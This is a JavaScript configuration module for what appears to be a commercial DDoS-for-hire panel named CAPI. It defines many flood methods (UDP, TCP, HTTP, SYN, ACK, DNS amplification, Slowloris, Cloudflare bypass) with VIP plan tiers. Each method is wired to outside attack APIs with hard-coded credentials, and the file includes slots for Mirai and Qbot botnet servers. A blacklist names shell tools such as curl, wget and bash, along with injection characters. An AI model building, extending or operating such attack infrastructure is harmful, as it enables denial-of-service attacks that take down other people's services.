export const DEFAULT_PAYLOAD = {
  note: 'CAPI default attack payload configuration',
  blacklists: {
    Blacklists_Targets: [
      '0.0.0.', '1.1.1.', '127.0.0.', '8.8.8.', '.gov', '.edu', '.gouv', 'curl', 'wget', 'echo', 'reboot', 'whoami', 'nano', 'mysql', 'localhost', 'bash', 'root', 'proc', 'apache2', 'sudo', 'bin', 'etc', '\\u', '.sh', '%0', '%1', '%20', '%21', '%22', '%24', '%25', '%27', '%28', '%29', '%2a', '%2b', '%2c', '%2d', '%2e', '%2f', '%3b', '%3c', '%3e', ';', '|', '[', ']', '<', '>', '{', '}', '+', '!', '~', '"', '\\', '$', '@', '(', ')', '`'
    ],
    ASN_NUMBER: ['AS16271'],
    ASN_NAME: ['OVH-SASS'],
    Countries: ['RU']
  },
  server_list: [
    { note: 'Layer 4 attack server', enabled: false, tag: 'LAYER 4 #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } },
    { note: 'Layer 7 attack server', enabled: false, tag: 'LAYER 7 #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } }
  ],
  bots_list: [
    { note: 'Mirai bot', enabled: false, tag: 'LAYER 4 Mirai #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } },
    { note: 'Qbot', enabled: false, tag: 'LAYER 7 Qbot #1', server_config: { ip: '1.1.1.1', port: 22, username: 'root', password: 'password' } }
  ],
  methods: [
    {
      name: 'udp',
      description: 'UDP flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'PhantomXV', url: 'https://api.insideproxy.me/api/attack?username=root&password=root&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=udp-gbps', method: 'GET' },
        { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=udp-pps', method: 'GET' },
        { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=udpstorm', method: 'GET' },
        { name: 'VahnNetworksss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=udpbypass', method: 'GET' },
        { name: 'VahnNetworkssss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-udp', method: 'GET' }
      ]
    },
    {
      name: 'tcp',
      description: 'TCP flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcp-legit', method: 'GET' },
        { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcpboom', method: 'GET' },
        { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=tcpbypass', method: 'GET' },
        { name: 'VahnNetworksss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-tcp', method: 'GET' }
      ]
    },
    {
      name: 'http',
      description: 'HTTP flood method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'XSERVICES', url: 'https://your-api1.com/api/attack?username=paid&password=paidd&host={target}&port={port}&time={duration}&method={method}', method: 'GET' },
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=browser', method: 'GET' },
        { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=http-full', method: 'GET' },
        { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=http-bypass', method: 'GET' },
        { name: 'VahnNetworksss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=http-connect', method: 'GET' }
      ]
    },
    {
      name: 'http-raw',
      description: 'Raw HTTP flood method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-http', method: 'GET' }
      ]
    },
    {
      name: 'cf-bypass',
      description: 'Cloudflare bypass method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: []
    },
    {
      name: 'https',
      description: 'HTTPS flood method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=httpsbypass', method: 'GET' }
      ]
    },
    {
      name: 'https-raw',
      description: 'Raw HTTPS flood method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-https', method: 'GET' }
      ]
    },
    {
      name: 'udp-flood',
      description: 'UDP flood variant',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: []
    },
    {
      name: 'tcp-flood',
      description: 'TCP flood variant',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: []
    },
    {
      name: 'http-flood',
      description: 'HTTP flood variant',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: []
    },
    {
      name: 'dns',
      description: 'DNS amplification method',
      enabled: true,
      target_type: 'url',
      default_port: 53,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: []
    },
    {
      name: 'icmp',
      description: 'ICMP flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 0,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: []
    },
    {
      name: 'syn',
      description: 'SYN flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: true, holder: false },
      api_links: [
        { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-syn', method: 'GET' },
      ]
    },
    {
      name: 'ack',
      description: 'ACK flood method',
      enabled: true,
      target_type: 'ip',
      default_port: 80,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-ack', method: 'GET' },
      ]
    },
    {
      name: 'slowloris',
      description: 'Slowloris style method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: []
    },
    {
      name: 'raw',
      description: 'Raw payload method',
      enabled: true,
      target_type: 'url',
      default_port: 443,
      max_concurrents: 5,
      max_slots: 5,
      min_time: 30,
      max_time: 60,
      roles: { holder: false, vip: false, admin: false, reseller: false, owner: false, private: false },
      plan_restrictions: { vip: false, holder: false },
      api_links: [
        { name: 'VahnNetwork', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-udp', method: 'GET' },
        { name: 'VahnNetworks', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-ack', method: 'GET' },
        { name: 'VahnNetworkss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-tcp', method: 'GET' },
        { name: 'VahnNetworksss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-fivem', method: 'GET' },
        { name: 'VahnNetworkssss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-stomp', method: 'GET' },
        { name: 'VahnNetworksssss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-pps', method: 'GET' },
        { name: 'VahnNetworkssssss', url: 'https://endpoint.vahnnetwork.cc/api/attack?username=laster&password=lasterbypass&host={host}&port={port}&time={duration}&method=raw-http', method: 'GET' },
      ]
    }
  ]
};

export function getPayloadMethods() {
  return DEFAULT_PAYLOAD.methods || [];
}

export function getPayloadBlacklists() {
  return DEFAULT_PAYLOAD.blacklists || {};
}

export function getPayloadServers() {
  return DEFAULT_PAYLOAD.server_list || [];
}

export function getPayloadBots() {
  return DEFAULT_PAYLOAD.bots_list || [];
}
